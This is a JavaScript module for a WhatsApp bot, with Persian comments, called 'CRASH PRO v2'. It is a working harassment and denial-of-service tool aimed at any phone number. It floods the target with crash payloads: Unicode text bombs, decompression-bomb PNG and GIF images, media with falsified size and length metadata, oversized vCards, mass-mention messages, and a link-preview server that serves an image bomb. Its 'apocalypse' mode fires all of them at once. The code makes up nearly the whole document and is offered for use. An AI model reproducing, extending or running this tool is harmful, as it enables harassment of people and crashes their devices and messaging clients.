// ==============================================
// CRASH PRO v2 — META BOMB
// متن flood از فایل:  data/crash pro.js
// ==============================================
import http from "http";
import zlib from "zlib";
import fs from "fs";
import path from "path";
import { fileURLToPath } from "url";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
let STOP = false;
let payloadCache = null;

// ---------- شماره / JID ----------
const isPhone = (a) => typeof a === "string" && /^\d{8,15}$/.test(a);
const toJid = (n) => n.replace(/\D/g, "") + "@s.whatsapp.net";

function extractTarget(args) {
  const idx = args.findIndex(isPhone);
  if (idx === -1) return { target: null, rest: args };
  return { target: toJid(args[idx]), rest: [...args.slice(0, idx), ...args.slice(idx + 1)] };
}

async function sendTo(sock, target, content, from) {
  const to = target || from;
  try { return await sock.sendMessage(to, content); }
  catch (e) { console.log("PRO SEND ERROR:", to, e.message); return null; }
}

// ---------- پول کانکارنسی ----------
async function runPool(items, worker, concurrency = 6) {
  let i = 0, ok = 0;
  const n = items.length;
  async function loop() {
    while (!STOP) {
      const idx = i++;
      if (idx >= n) return;
      try { if (await worker(items[idx], idx)) ok++; } catch (_) {}
    }
  }
  await Promise.all(Array.from({ length: Math.min(concurrency, n) }, loop));
  return ok;
}

// ---------- متن از فایل ----------
const PAYLOAD_PATHS = [
  path.join(__dirname, "data", "crash pro.js"),
  path.join(__dirname, "data", "crash pro.js"),
  path.join(__dirname, "data", "crash pro.txt"),
  path.join(__dirname, "crash pro.js"),
  path.join(__dirname, "crash pro.js"),
];

function fallbackPayloads() {
  return [
    "\u200B".repeat(50000) + "⚫",
    "⚫\u200B".repeat(50000),
    "لَا إِلَٰهَ إِلَّا اللَّهُ" + "\u0651\u064E\u064F\u0650\u0652".repeat(1800),
    "👨\u200D👩\u200D👧\u200D👦".repeat(30000),
    "ༀ".repeat(50000),
    "\u202E" + "!ینامزاس یسررب یارب".repeat(50000),
  ];
}

async function loadPayloadsFromFile(f) {
  let raw;
  try { raw = fs.readFileSync(f, "utf8").replace(/^\uFEFF/, ""); } catch { return null; }
  const trimmed = raw.trim();
  if (!trimmed) return null;
  try {
    const j = JSON.parse(trimmed);
    if (Array.isArray(j)) {
      const arr = j.filter((x) => typeof x === "string" && x.trim().length > 0);
      if (arr.length) return arr;
    }
  } catch {}
  if (f.endsWith(".js") || /export\s+default|module\.exports/.test(trimmed)) {
    let src = trimmed;
    if (/module\.exports\s*=/.test(src)) src = src.replace(/module\.exports\s*=\s*/, "export default ");
    else if (!/export\s+default/.test(src)) src = "export default " + src;
    try {
      const mod = await import("data:text/javascript;base64," + Buffer.from(src, "utf8").toString("base64"));
      if (Array.isArray(mod.default)) {
        const arr = mod.default.filter((x) => typeof x === "string" && x.trim().length > 0);
        if (arr.length) return arr;
      }
    } catch {}
  }
  const lines = raw.split(/\r?\n/).map((s) => s.trim())
    .filter((s) => s.length > 0 && !s.startsWith("#") && !s.startsWith("//"));
  if (lines.length) return lines;
  return null;
}

async function getPayloads(force = false) {
  if (payloadCache && !force) return payloadCache;
  for (const p of PAYLOAD_PATHS) {
    if (!fs.existsSync(p)) continue;
    const arr = await loadPayloadsFromFile(p);
    if (arr && arr.length) { payloadCache = arr; console.log("PRO: فایل:", p, arr.length, "پیام"); return arr; }
  }
  payloadCache = fallbackPayloads();
  console.log("PRO: متن پیش‌فرض");
  return payloadCache;
}

// ---------- PNG ----------
const CRC_TABLE = (() => {
  const t = new Uint32Array(256);
  for (let n = 0; n < 256; n++) {
    let c = n;
    for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
    t[n] = c >>> 0;
  }
  return t;
})();

function crc32(buf) {
  let c = 0xffffffff;
  for (let i = 0; i < buf.length; i++) c = CRC_TABLE[(c ^ buf[i]) & 0xff] ^ (c >>> 8);
  return (c ^ 0xffffffff) >>> 0;
}

const pngChunk = (type, data) => {
  if (!Buffer.isBuffer(data)) data = Buffer.from(data);
  const t = Buffer.from(type, "ascii");
  const out = Buffer.alloc(12 + data.length);
  out.writeUInt32BE(data.length, 0);
  t.copy(out, 4);
  data.copy(out, 8);
  const crcBuf = Buffer.allocUnsafe(4 + data.length);
  t.copy(crcBuf, 0);
  data.copy(crcBuf, 4);
  out.writeUInt32BE(crc32(crcBuf), 8 + data.length);
  return out;
};

const PNG_MAX = 12000;
const PNG_EXTREME = 16000;

function makeBombPng(w, h, rgb) {
  w = Math.max(1, Math.min(w | 0, 24000));
  h = Math.max(1, Math.min(h | 0, 24000));
  const [r, g, b] = rgb;
  return new Promise((resolve, reject) => {
    const row = Buffer.allocUnsafe(1 + w * 3);
    row[0] = 0;
    for (let x = 0, p = 1; x < w; x++) { row[p++] = r; row[p++] = g; row[p++] = b; }
    const d = zlib.createDeflate({ level: 9, chunkSize: 32 * 1024 });
    const out = [];
    d.on("data", (c) => out.push(c));
    d.on("error", reject);
    d.on("end", () => {
      try {
        const ihdr = Buffer.alloc(13);
        ihdr.writeUInt32BE(w, 0);
        ihdr.writeUInt32BE(h, 4);
        ihdr[8] = 8; ihdr[9] = 2; ihdr[10] = 0; ihdr[11] = 0; ihdr[12] = 0;
        const sig = Buffer.from([137, 80, 78, 71, 13, 10, 26, 10]);
        resolve(Buffer.concat([sig, pngChunk("IHDR", ihdr), pngChunk("IDAT", Buffer.concat(out)), pngChunk("IEND", Buffer.alloc(0))]));
      } catch (e) { reject(e); }
    });
    let y = 0;
    const pump = () => {
      try {
        if (y >= h) { d.end(); return; }
        const end = Math.min(y + 100, h);
        for (; y < end; y++) {
          if (!d.write(Buffer.from(row))) { d.once("drain", pump); return; }
        }
        setImmediate(pump);
      } catch (e) { reject(e); }
    };
    pump();
  });
}

const pngCache = new Map();
async function getPng(w, h, color) {
  w = Math.min(w, 24000);
  h = Math.min(h, 24000);
  const key = `${w}x${h}#${color.join(",")}`;
  if (!pngCache.has(key)) {
    console.log(`PRO: ساخت PNG ${w}x${h}...`);
    pngCache.set(key, await makeBombPng(w, h, color));
  }
  return pngCache.get(key);
}

// ---------- GIF ----------
function encodeSolidGifStable(minCodeSize, totalPixels) {
  const clear = 1 << minCodeSize;
  const eoi = clear + 1;
  let codeSize = minCodeSize + 1;
  let nextCode = eoi + 1;
  const dict = new Map();
  const bits = [];
  const writeCode = (code) => {
    for (let i = 0; i < codeSize; i++) bits.push((code >> i) & 1);
  };
  writeCode(clear);
  let w = String.fromCharCode(0);
  for (let i = 1; i < totalPixels; i++) {
    const c = String.fromCharCode(0);
    const wc = w + c;
    if (dict.has(wc)) { w = wc; }
    else {
      writeCode(w.length === 1 ? w.charCodeAt(0) : dict.get(w));
      if (nextCode < 4096) {
        dict.set(wc, nextCode++);
        if (nextCode > (1 << codeSize) && codeSize < 12) codeSize++;
      } else {
        writeCode(clear);
        dict.clear();
        codeSize = minCodeSize + 1;
        nextCode = eoi + 1;
      }
      w = c;
    }
  }
  writeCode(w.length === 1 ? w.charCodeAt(0) : dict.get(w));
  writeCode(eoi);
  const bytes = [];
  for (let i = 0; i < bits.length; i += 8) {
    let b = 0;
    for (let j = 0; j < 8 && i + j < bits.length; j++) b |= bits[i + j] << j;
    bytes.push(b);
  }
  return bytes;
}

function makeGifScreenBomb() {
  const lsd = Buffer.alloc(7);
  lsd.writeUInt16LE(65535, 0);
  lsd.writeUInt16LE(65535, 2);
  lsd[4] = 0x80; lsd[5] = 0; lsd[6] = 0;
  const gct = Buffer.from([0, 0, 0, 255, 255, 255]);
  const imgDesc = Buffer.alloc(10);
  imgDesc[0] = 0x2c;
  imgDesc.writeUInt16LE(0, 1);
  imgDesc.writeUInt16LE(0, 3);
  imgDesc.writeUInt16LE(1, 5);
  imgDesc.writeUInt16LE(1, 7);
  imgDesc[9] = 0;
  const data = encodeSolidGifStable(2, 1);
  return Buffer.concat([
    Buffer.from("GIF89a"), lsd, gct, imgDesc,
    Buffer.from([2]), Buffer.from([data.length]), Buffer.from(data),
    Buffer.from([0]), Buffer.from([0x3b]),
  ]);
}

const gifFrameCache = new Map();
async function getGifFrameBomb(w, h) {
  w = Math.min(w, 4000);
  h = Math.min(h, 4000);
  const key = `${w}x${h}`;
  if (!gifFrameCache.has(key)) {
    const px = Math.min(w * h, 8_000_000);
    const data = encodeSolidGifStable(2, px);
    const lsd = Buffer.alloc(7);
    lsd.writeUInt16LE(w, 0);
    lsd.writeUInt16LE(h, 2);
    lsd[4] = 0x80; lsd[5] = 0; lsd[6] = 0;
    const gct = Buffer.from([0, 0, 0, 255, 255, 255]);
    const imgDesc = Buffer.alloc(10);
    imgDesc[0] = 0x2c;
    imgDesc.writeUInt16LE(0, 1);
    imgDesc.writeUInt16LE(0, 3);
    imgDesc.writeUInt16LE(w, 5);
    imgDesc.writeUInt16LE(h, 7);
    imgDesc[9] = 0;
    const subs = [];
    for (let i = 0; i < data.length; i += 255) {
      const n = Math.min(255, data.length - i);
      subs.push(Buffer.from([n]), Buffer.from(data.slice(i, i + n)));
    }
    subs.push(Buffer.from([0]));
    gifFrameCache.set(key, Buffer.concat([
      Buffer.from("GIF89a"), lsd, gct, imgDesc, Buffer.from([2]), ...subs, Buffer.from([0x3b]),
    ]));
  }
  return gifFrameCache.get(key);
}

// ---------- WAV ----------
function makeWav(seconds, sampleRate = 8000) {
  const n = sampleRate * seconds;
  const data = Buffer.alloc(n * 2);
  const hdr = Buffer.alloc(44);
  hdr.write("RIFF", 0);
  hdr.writeUInt32LE(36 + data.length, 4);
  hdr.write("WAVE", 8);
  hdr.write("fmt ", 12);
  hdr.writeUInt32LE(16, 16);
  hdr.writeUInt16LE(1, 20);
  hdr.writeUInt16LE(1, 22);
  hdr.writeUInt32LE(sampleRate, 24);
  hdr.writeUInt32LE(sampleRate * 2, 28);
  hdr.writeUInt16LE(2, 32);
  hdr.writeUInt16LE(16, 34);
  hdr.write("data", 36);
  hdr.writeUInt32LE(data.length, 40);
  return Buffer.concat([hdr, data]);
}

// ---------- vCard ----------
const nameParts = ["محمد", "علی", "احمد", "حسین", "رضا", "مهدی"];
function giantName(len) {
  let s = "";
  while (s.length < len) {
    s += nameParts[(Math.random() * nameParts.length) | 0] + "\u200B\u0651\u064E\u0650\u202E\uFE0F";
  }
  return s.slice(0, len);
}
function makeVcardBomb(count = 80, nameLen = 2000) {
  let out = "";
  for (let i = 0; i < count; i++) {
    const nm = giantName(nameLen);
    out += `BEGIN:VCARD\nVERSION:3.0\nN:${nm};;;\nFN:${nm}\nTEL;TYPE=CELL:+93700000000\nEND:VCARD\n`;
  }
  return Buffer.from(out, "utf8");
}

// ---------- سرور لینک‌پریویو ----------
const PUBLIC_BASE = process.env.CAM_URL || "http://localhost:8080";
let linkServer = null;
const LINK_PORT = 8082;

function startLinkServer() {
  if (linkServer) return;
  linkServer = http.createServer(async (req, res) => {
    try {
      if (req.url === "/bomb.png") {
        const img = await getPng(8000, 8000, [255, 0, 0]);
        res.writeHead(200, { "Content-Type": "image/png", "Cache-Control": "no-store" });
        res.end(img);
        return;
      }
      if (req.url === "/p") {
        res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
        res.end(`<!DOCTYPE html><html><head>
<meta property="og:title" content="Photo">
<meta property="og:image" content="${PUBLIC_BASE}/bomb.png">
<meta property="og:image:width" content="8000">
<meta property="og:image:height" content="8000">
</head><body>ok</body></html>`);
        return;
      }
      res.writeHead(404);
      res.end("nf");
    } catch (e) { res.writeHead(500); res.end("err"); }
  });
  linkServer.listen(LINK_PORT, "0.0.0.0", () => console.log("PRO LINK SERVER:", LINK_PORT));
}

// ==============================================
// حمله‌های جدید v2 — متادیتای دروغین
// ==============================================

// 1) META BOMB — تصویر/صوت/سند واقعیِ کوچک ولی هدر دروغین
async function metaBomb(sock, target, count, from) {
  const tiny = await getPng(16, 16, [255, 0, 0]); // فایل واقعی فقط ۱۶px!
  const tinyWav = makeWav(1);
  const items = Array.from({ length: count }, (_, i) => i);
  return runPool(items, async (i) => {
    const kind = i % 4;
    if (kind === 0) {
      return sendTo(sock, target, {
        image: tiny, mimetype: "image/png",
        width: 65535, height: 65535,       // دروغ: ۶۵۵۳۵ × ۶۵۵۳۵
        fileLength: 0x7fffffff,             // دروغ: ~۲ گیگابایت
        caption: "\u200B".repeat(3000) + "x",
      }, from);
    }
    if (kind === 1) {
      return sendTo(sock, target, {
        audio: tinyWav, mimetype: "audio/wav", ptt: true,
        seconds: 0xffffffff,                // دروغ: ۴ میلیارد ثانیه
      }, from);
    }
    if (kind === 2) {
      return sendTo(sock, target, {
        document: tiny, mimetype: "image/png",
        fileName: "scan.png",
        fileLength: 0x7fffffff,
        pageCount: 65535,
      }, from);
    }
    return sendTo(sock, target, {
      image: tiny, mimetype: "image/png", viewOnce: true,
      width: 65535, height: 65535,
      fileLength: 0x7fffffff,
    }, from);
  }, 4);
}

// 2) LINE — تک‌خط ۶۵ کیلوبایتی (بدون فاصله/خط جدید) = کرش رندر متن
function makeLinePayload(targetBytes = 65500) {
  const unit = "\u202Eا\u0651\u064E\u0650\uFE0F\u200D"; // RTL+زبر+فتحه+کسره+ZWJ
  let s = "";
  while (Buffer.byteLength(s, "utf8") < targetBytes) s += unit;
  const buf = Buffer.from(s, "utf8").subarray(0, targetBytes);
  return buf.toString("utf8").replace(/\uFFFD/g, "");
}

async function lineAttack(sock, target, count, from) {
  const payload = makeLinePayload();
  console.log("PRO: LINE payload =", Buffer.byteLength(payload, "utf8"), "بایت");
  const items = Array.from({ length: count }, (_, i) => i);
  return runPool(items, () => sendTo(sock, target, { text: payload }, from), 5);
}

// 3) MENTION — ۱۲۰ منشن در یک پیام
async function mentionAttack(sock, target, count, from) {
  const jids = Array.from({ length: 120 }, (_, i) =>
    i % 2 === 0 ? target : toJid("9370" + String(10000000 + ((i * 7919) % 89999999)))
  );
  const items = Array.from({ length: count }, (_, i) => i);
  return runPool(items, (i) => sendTo(sock, target, {
    text: "\u200B".repeat(500) + "@" + i,
    mentions: jids,
  }, from), 5);
}

// 4) CARD — کارت مخاطب با اسم غول‌پیکر
async function cardAttack(sock, target, count, from) {
  const items = Array.from({ length: count }, (_, i) => i);
  return runPool(items, (i) => sendTo(sock, target, {
    contacts: {
      displayName: giantName(30000) + i,
      contacts: Array.from({ length: 20 }, (_, k) => ({
        vcard: "BEGIN:VCARD\nVERSION:3.0\nFN:" + giantName(5000) + k + "\nEND:VCARD",
      })),
    },
  }, from), 3);
}

// 5) Q-BOMB — نقل‌قول جعلی با کپشن/متدیتای دروغین
async function quoteBomb(sock, target, count, from) {
  const items = Array.from({ length: count }, (_, i) => i);
  return runPool(items, (i) => sendTo(sock, target, {
    text: "q" + i,
    contextInfo: {
      quotedMessage: {
        imageMessage: {
          url: "https://example.com/x.png",
          mimetype: "image/png",
          caption: "\u200B".repeat(30000) + "⚫".repeat(30000),
          width: 65535,
          height: 65535,
          jpegThumbnail: Buffer.alloc(0),
        },
      },
    },
  }, from), 4);
}

// ---------- حملات قدیمی (flood) ----------
async function textFlood(sock, target, count, from) {
  const payloads = await getPayloads();
  const items = Array.from({ length: count }, (_, i) => payloads[i % payloads.length]);
  return runPool(items, (txt) => sendTo(sock, target, { text: txt }, from), 6);
}

async function burstFlood(sock, target, count, from) {
  const payloads = await getPayloads();
  const items = [];
  for (let i = 0; i < Math.min(count, 2000); i++) for (const p of payloads) items.push(p);
  return runPool(items, (txt) => sendTo(sock, target, { text: txt }, from), 12);
}

async function quoteFlood(sock, target, count, from) {
  const payloads = await getPayloads();
  const items = Array.from({ length: count }, (_, i) => payloads[i % payloads.length]);
  return runPool(items, (txt) => sendTo(sock, target, {
    text: "متن " + Math.floor(Math.random() * 1e9),
    contextInfo: { quotedMessage: { extendedTextMessage: { text: txt.slice(0, 30000) } } },
  }, from), 5);
}

async function reactFlood(sock, target, count, from) {
  const emojis = ["😈", "💥", "🔥", "💀", "😵", "🤯", "👹", "🖕"];
  let ok = 0;
  for (let i = 0; i < count && !STOP; i++) {
    const sent = await sendTo(sock, target, { text: "⚫" + i }, from);
    if (!sent) continue;
    try {
      await sock.sendMessage(target || from, { react: { text: emojis[i % emojis.length], key: sent.key } });
      ok++;
    } catch (_) {}
    await sleep(120);
  }
  return ok;
}

async function mediaFlood(sock, target, count, extreme, from) {
  const base = extreme ? PNG_EXTREME : PNG_MAX;
  const sizes = [
    [base, base, [255, 0, 0]],
    [Math.floor(base * 0.85), Math.floor(base * 0.85), [0, 255, 0]],
    [Math.floor(base * 0.7), Math.floor(base * 0.7), [0, 0, 255]],
  ];
  const items = Array.from({ length: count }, (_, i) => i);
  return runPool(items, async (i) => {
    const [w, h, c] = sizes[i % sizes.length];
    const img = await getPng(w, h, c);
    const content = { image: img, caption: "b" + i, mimetype: "image/png" };
    if (extreme) content.viewOnce = true;
    return sendTo(sock, target, content, from);
  }, extreme ? 3 : 2);
}

async function voiceFlood(sock, target, count, from) {
  const wav = makeWav(10);
  const items = Array.from({ length: count }, (_, i) => i);
  return runPool(items, () => sendTo(sock, target, { audio: wav, mimetype: "audio/wav", ptt: true }, from), 4);
}

async function pollFlood(sock, target, count, from) {
  const items = Array.from({ length: count }, (_, i) => i);
  return runPool(items, (i) => sendTo(sock, target, {
    poll: {
      name: "\u200B".repeat(50000) + "نظر" + i,
      values: Array.from({ length: 12 }, (_, k) => "\u200B".repeat(80) + "گزینه" + k),
      selectableCount: 1,
    },
  }, from), 4);
}

async function locFlood(sock, target, count, from) {
  const items = Array.from({ length: count }, (_, i) => i);
  return runPool(items, (i) => sendTo(sock, target, {
    location: { degreesLatitude: 31.5 + i * 0.001, degreesLongitude: 63.3 + i * 0.001 },
  }, from), 5);
}

async function docFlood(sock, target, count, from) {
  const doc = await getPng(Math.floor(PNG_MAX * 0.75), Math.floor(PNG_MAX * 0.75), [0, 0, 255]);
  const items = Array.from({ length: count }, (_, i) => i);
  return runPool(items, (i) => sendTo(sock, target, {
    document: doc, mimetype: "image/png", fileName: "scan" + i + ".png",
  }, from), 3);
}

async function vcardFlood(sock, target, count, from) {
  const items = Array.from({ length: count }, (_, i) => i);
  return runPool(items, (i) => sendTo(sock, target, {
    contacts: {
      displayName: "کاربر" + i,
      contacts: Array.from({ length: 20 }, (_, k) => ({
        vcard: "BEGIN:VCARD\nVERSION:3.0\nFN:" + giantName(1500) + k + "\nEND:VCARD",
      })),
    },
  }, from), 3);
}

async function mega(sock, target, extreme, from) {
  const side = extreme ? PNG_EXTREME : PNG_MAX;
  const png = await getPng(side, side, [255, 0, 0]);
  const doc = await getPng(Math.floor(side * 0.75), Math.floor(side * 0.75), [0, 0, 255]);
  const gif = extreme ? await getGifFrameBomb(3000, 3000) : makeGifScreenBomb();

  const r1 = await sendTo(sock, target, { image: png, caption: "photo", mimetype: "image/png" }, from);
  await sleep(400);
  const r2 = await sendTo(sock, target, { image: gif, caption: "gif", mimetype: "image/gif" }, from);
  await sleep(400);
  const r3 = await sendTo(sock, target, { document: doc, mimetype: "image/png", fileName: "scan.png" }, from);
  await sleep(400);
  const r4 = await sendTo(sock, target, { document: makeVcardBomb(), mimetype: "text/x-vcard", fileName: "contacts.vcf" }, from);

  return { png: !!r1, gif: !!r2, doc: !!r3, vcf: !!r4 };
}

// ---------- APOCALYPSE: همه‌چیز هم‌زمان ----------
async function apocalypse(sock, target, rounds, extreme, from) {
  const [a, b, c, d, e, f] = await Promise.all([
    lineAttack(sock, target, rounds * 3, from),
    metaBomb(sock, target, rounds * 2, from),
    mentionAttack(sock, target, rounds * 3, from),
    cardAttack(sock, target, rounds, from),
    quoteBomb(sock, target, rounds * 2, from),
    burstFlood(sock, target, rounds * 5, from),
  ]);
  let megaRes = null;
  if (!STOP) {
    try { megaRes = await mega(sock, target, extreme, from); } catch (_) {}
  }
  return { line: a, meta: b, mention: c, card: d, quote: e, burst: f, mega: megaRes };
}

async function total(sock, target, rounds, extreme, from) {
  const [a, b, c, d, e, f, g, h] = await Promise.all([
    textFlood(sock, target, rounds * 6, from),
    mediaFlood(sock, target, rounds * (extreme ? 2 : 1), extreme, from),
    quoteFlood(sock, target, rounds * 3, from),
    reactFlood(sock, target, rounds * 3, from),
    voiceFlood(sock, target, rounds * 2, from),
    pollFlood(sock, target, rounds * 1, from),
    locFlood(sock, target, rounds * 3, from),
    docFlood(sock, target, rounds * 2, from),
  ]);
  let megaRes = null;
  if (!STOP) {
    try { megaRes = await mega(sock, target, extreme, from); } catch (_) {}
  }
  return { t: a, m: b, q: c, r: d, v: e, p: f, l: g, d: h, mega: megaRes };
}

// ---------- هندلر ----------
export default async function crashPro(sock, from, body, m, args) {
  STOP = false;
  const { target, rest } = extractTarget(args);
  const who = target ? target.replace("@s.whatsapp.net", "") : "چت فعلی";
  const extreme = rest.includes("extreme");
  const rest2 = rest.filter((a) => a !== "extreme");

  if (rest2.length === 0) {
    await sock.sendMessage(from, {
      text:
        "🧨 CRASH PRO v2 (META BOMB)\n\n" +
        "!cpro meta <n> | !cpro line <n> | !cpro mention <n>\n" +
        "!cpro card <n> | !cpro qbomb <n>\n" +
        "!cpro apocalypse <n> [extreme] [شماره]\n\n" +
        "!cpro flood|burst|total|mega|png|gif|vcard|contacts|doc|media|quote|react|voice|poll|loc|link <n> [extreme] [شماره]\n" +
        "!cpro info | reload | stop | list\n\n" +
        "مثال: !cpro apocalypse 3 extreme 93794394088",
    });
    return;
  }

  const first = rest2[0].toLowerCase();
  const getN = (def, max = 300) => {
    const num = rest2.slice(1).find((a) => /^\d{1,3}$/.test(a));
    return Math.min(parseInt(num, 10) || def, max);
  };

  if (first === "stop") { STOP = true; await sock.sendMessage(from, { text: "🛑 متوقف شد." }); return; }
  if (first === "list") {
    await sock.sendMessage(from, {
      text: "🧨 meta | line | mention | card | qbomb | apocalypse | flood | burst | total | mega | png | gif | vcard | contacts | doc | media | quote | react | voice | poll | loc | link | info | reload | stop",
    });
    return;
  }
  if (first === "info") {
    const payloads = await getPayloads();
    const lens = payloads.map((p) => p.length);
    await sock.sendMessage(from, {
      text: `📊 INFO\nمتن‌های فایل: ${payloads.length}\nمیانگین: ${Math.round(lens.reduce((a, b) => a + b, 0) / lens.length)} | بیشترین: ${Math.max(...lens)} کاراکتر`,
    });
    return;
  }
  if (first === "reload") {
    payloadCache = null;
    const payloads = await getPayloads();
    await sock.sendMessage(from, { text: `🔄 فایل دوباره خوانده شد → ${payloads.length} پیام` });
    return;
  }

  let res, msg;

  try {
    switch (first) {
      case "meta":
        res = await metaBomb(sock, target, getN(10), from);
        msg = `🧬 META BOMB → ${who}\nارسال موفق: ${res} (اگه ۰ شد یعنی سرور فیلدهای دروغین رو رد کرد)`;
        break;

      case "line":
        res = await lineAttack(sock, target, getN(5), from);
        msg = `⚫ LINE BOMB (۶۵KB تک‌خط) → ${who}\nارسال موفق: ${res}`;
        break;

      case "mention":
        res = await mentionAttack(sock, target, getN(5), from);
        msg = `🏷 MENTION BOMB (۱۲۰ منشن) → ${who}\nارسال موفق: ${res}`;
        break;

      case "card":
        res = await cardAttack(sock, target, getN(5), from);
        msg = `👥 CARD BOMB (اسم غول‌پیکر) → ${who}\nارسال موفق: ${res}`;
        break;

      case "qbomb":
        res = await quoteBomb(sock, target, getN(10), from);
        msg = `📎 QUOTE BOMB (نقل‌قول دروغین) → ${who}\nارسال موفق: ${res}`;
        break;

      case "apocalypse":
        res = await apocalypse(sock, target, getN(2, 5), extreme, from);
        msg =
          `☠️ APOCALYPSE → ${who}${extreme ? " [EXTREME]" : ""}\n` +
          `line: ${res.line} | meta: ${res.meta} | mention: ${res.mention}\n` +
          `card: ${res.card} | qbomb: ${res.quote} | burst: ${res.burst}\n` +
          `MEGA: png=${res.mega?.png ? "✅" : "❌"} gif=${res.mega?.gif ? "✅" : "❌"} doc=${res.mega?.doc ? "✅" : "❌"} vcf=${res.mega?.vcf ? "✅" : "❌"}`;
        break;

      case "flood":
        res = await textFlood(sock, target, getN(10), from);
        msg = `📨 TEXT FLOOD (فایل) → ${who}\nارسال موفق: ${res}`;
        break;

      case "burst":
        res = await burstFlood(sock, target, getN(10), from);
        msg = `⚡ BURST → ${who}\nارسال موفق: ${res}`;
        break;

      case "total":
        res = await total(sock, target, getN(2, 5), extreme, from);
        msg =
          `💥 TOTAL → ${who}${extreme ? " [EXTREME]" : ""}\n` +
          `متن: ${res.t} | تصویر: ${res.m} | نقل‌قول: ${res.q} | ریکشن: ${res.r}\n` +
          `وویس: ${res.v} | پول: ${res.p} | مکان: ${res.l} | سند: ${res.d}\n` +
          `MEGA: png=${res.mega?.png ? "✅" : "❌"} gif=${res.mega?.gif ? "✅" : "❌"} doc=${res.mega?.doc ? "✅" : "❌"} vcf=${res.mega?.vcf ? "✅" : "❌"}`;
        break;

      case "mega":
        res = await mega(sock, target, extreme, from);
        msg = `💣 MEGA → ${who}\nPNG: ${res.png ? "✅" : "❌"} | GIF: ${res.gif ? "✅" : "❌"}\nDOC: ${res.doc ? "✅" : "❌"} | vCard: ${res.vcf ? "✅" : "❌"}`;
        break;

      case "png": {
        const side = extreme ? PNG_EXTREME : PNG_MAX;
        const img = await getPng(side, side, [255, 0, 0]);
        res = await sendTo(sock, target, { image: img, caption: "photo", mimetype: "image/png" }, from);
        msg = res ? `🖼 PNG بمب (${side}²) → ${who}` : `❌ ناموفق`;
        break;
      }

      case "gif": {
        const gif = extreme ? await getGifFrameBomb(3000, 3000) : makeGifScreenBomb();
        res = await sendTo(sock, target, { image: gif, caption: "gif", mimetype: "image/gif" }, from);
        msg = res ? `🎞 GIF بمب → ${who}` : `❌ ناموفق`;
        break;
      }

      case "vcard":
        res = await sendTo(sock, target, { document: makeVcardBomb(), mimetype: "text/x-vcard", fileName: "contacts.vcf" }, from);
        msg = res ? `👥 vCard بمب → ${who}` : `❌ ناموفق`;
        break;

      case "contacts":
        res = await sendTo(sock, target, {
          contacts: {
            displayName: "کاربر",
            contacts: Array.from({ length: 20 }, (_, i) => ({
              vcard: "BEGIN:VCARD\nVERSION:3.0\nFN:" + giantName(1500) + i + "\nEND:VCARD",
            })),
          },
        }, from);
        msg = res ? `👤 Contacts بمب → ${who}` : `❌ ناموفق`;
        break;

      case "doc":
        res = await docFlood(sock, target, getN(5), from);
        msg = `📄 DOC FLOOD → ${who}\nارسال موفق: ${res}`;
        break;

      case "media":
        res = await mediaFlood(sock, target, getN(5), extreme, from);
        msg = `🖼 MEDIA FLOOD → ${who}${extreme ? " [EXTREME]" : ""}\nارسال موفق: ${res}`;
        break;

      case "quote":
        res = await quoteFlood(sock, target, getN(10), from);
        msg = `📝 QUOTE FLOOD (فایل) → ${who}\nارسال موفق: ${res}`;
        break;

      case "react":
        res = await reactFlood(sock, target, getN(10), from);
        msg = `😈 REACT FLOOD → ${who}\nریکشن موفق: ${res}`;
        break;

      case "voice":
        res = await voiceFlood(sock, target, getN(5), from);
        msg = `🎤 VOICE FLOOD → ${who}\nارسال موفق: ${res}`;
        break;

      case "poll":
        res = await pollFlood(sock, target, getN(5), from);
        msg = `📊 POLL FLOOD → ${who}\nارسال موفق: ${res}`;
        break;

      case "loc":
        res = await locFlood(sock, target, getN(10), from);
        msg = `📍 LOCATION FLOOD → ${who}\nارسال موفق: ${res}`;
        break;

      case "link":
        startLinkServer();
        res = await sendTo(sock, target, { text: `${PUBLIC_BASE}/p` }, from);
        msg = res ? `🔗 لینک‌پریویو بمب → ${who}` : `❌ ناموفق`;
        break;

      default:
        msg = `❓ ناشناخته: ${first}\n!cpro list`;
    }
  } catch (e) {
    msg = "❌ خطا: " + e.message;
    console.log("PRO ERROR:", e);
  }

  await sock.sendMessage(from, { text: msg });
}